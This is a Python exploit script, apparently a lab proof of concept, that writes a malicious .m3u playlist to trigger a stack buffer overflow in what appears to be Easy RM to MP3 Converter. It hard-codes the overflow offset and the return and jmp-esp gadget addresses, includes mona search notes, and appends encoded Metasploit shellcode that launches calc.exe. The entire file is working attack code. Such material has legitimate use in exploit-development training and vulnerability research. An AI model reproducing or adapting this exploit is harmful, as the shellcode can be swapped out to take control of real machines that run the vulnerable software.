import struct
import os

# main OFFSET = 26064
OFFSET = 26064
garbage = "A" * OFFSET

pop_pop_ret = 0x1002d8d1
jmp_esp = 0x7C86467B

# Message=  0x1002d8d1 : "\x5b\x58\xc3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (Z:\vmshared\vuln_apps\easyRMtoMP3_2_7_3_700\MSRMfilter03.dll)
#
# 00000000  5B                pop eb
# 00000000  58                pop eax
# 00000000  C3                ret
#
#
# !mona find -s "\x5d\xc3" -m kernel32.dll
# 0x7C86467B # JMP ESP  - kernel32.dll - FFE4
# 0x7C868667 # CALL ESP - kernel32.dll - FFD4

EIP = struct.pack("<I", pop_pop_ret)
jmp_esp = struct.pack("<I", jmp_esp)

nop_sled = "\x90" * 100

# windows/exec - 455 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# VERBOSE=false, PrependMigrate=false, EXITFUNC=thread,
# CMD=calc.exe
buf =  ""
buf += "\x89\xe5\xd9\xe9\xd9\x75\xf4\x58\x50\x59\x49\x49\x49"
buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += "\x4a\x49\x4b\x4c\x4d\x38\x4b\x32\x33\x30\x43\x30\x55"
buf += "\x50\x45\x30\x4b\x39\x4d\x35\x56\x51\x39\x50\x52\x44"
buf += "\x4c\x4b\x56\x30\x56\x50\x4c\x4b\x51\x42\x54\x4c\x4c"
buf += "\x4b\x36\x32\x35\x44\x4c\x4b\x52\x52\x37\x58\x44\x4f"
buf += "\x4f\x47\x31\x5a\x47\x56\x36\x51\x4b\x4f\x4e\x4c\x37"
buf += "\x4c\x33\x51\x43\x4c\x55\x52\x36\x4c\x51\x30\x49\x51"
buf += "\x38\x4f\x44\x4d\x33\x31\x59\x57\x5a\x42\x5a\x52\x50"
buf += "\x52\x30\x57\x4c\x4b\x46\x32\x42\x30\x4c\x4b\x50\x4a"
buf += "\x57\x4c\x4c\x4b\x50\x4c\x42\x31\x53\x48\x4b\x53\x30"
buf += "\x48\x55\x51\x38\x51\x30\x51\x4c\x4b\x46\x39\x31\x30"
buf += "\x53\x31\x58\x53\x4c\x4b\x31\x59\x52\x38\x5a\x43\x57"
buf += "\x4a\x47\x39\x4c\x4b\x30\x34\x4c\x4b\x45\x51\x59\x46"
buf += "\x46\x51\x4b\x4f\x4e\x4c\x49\x51\x48\x4f\x44\x4d\x43"
buf += "\x31\x59\x57\x47\x48\x4d\x30\x54\x35\x5a\x56\x33\x33"
buf += "\x33\x4d\x4c\x38\x37\x4b\x33\x4d\x46\x44\x44\x35\x5a"
buf += "\x44\x46\x38\x4c\x4b\x51\x48\x47\x54\x45\x51\x38\x53"
buf += "\x52\x46\x4c\x4b\x54\x4c\x30\x4b\x4c\x4b\x50\x58\x45"
buf += "\x4c\x45\x51\x4e\x33\x4c\x4b\x44\x44\x4c\x4b\x55\x51"
buf += "\x48\x50\x4c\x49\x57\x34\x57\x54\x46\x44\x31\x4b\x51"
buf += "\x4b\x55\x31\x56\x39\x31\x4a\x30\x51\x4b\x4f\x4b\x50"
buf += "\x31\x4f\x31\x4f\x30\x5a\x4c\x4b\x55\x42\x5a\x4b\x4c"
buf += "\x4d\x51\x4d\x43\x5a\x55\x51\x4c\x4d\x4d\x55\x4e\x52"
buf += "\x33\x30\x33\x30\x55\x50\x56\x30\x32\x48\x36\x51\x4c"
buf += "\x4b\x32\x4f\x4b\x37\x4b\x4f\x58\x55\x4f\x4b\x4d\x30"
buf += "\x45\x4d\x56\x4a\x44\x4a\x35\x38\x59\x36\x5a\x35\x4f"
buf += "\x4d\x4d\x4d\x4b\x4f\x49\x45\x57\x4c\x44\x46\x33\x4c"
buf += "\x35\x5a\x4d\x50\x4b\x4b\x4d\x30\x32\x55\x43\x35\x4f"
buf += "\x4b\x30\x47\x42\x33\x42\x52\x32\x4f\x43\x5a\x43\x30"
buf += "\x56\x33\x4b\x4f\x38\x55\x42\x43\x55\x31\x52\x4c\x32"
buf += "\x43\x46\x4e\x33\x55\x43\x48\x55\x35\x53\x30\x41\x41"

shellcode = buf
pad =  "\x90" * 12

payload = garbage + EIP + pad + jmp_esp + nop_sled + shellcode

out_file = "%s4.m3u" % __file__[:-3]

with open(out_file, "wb") as f:
    f.write(payload)
    f.close()
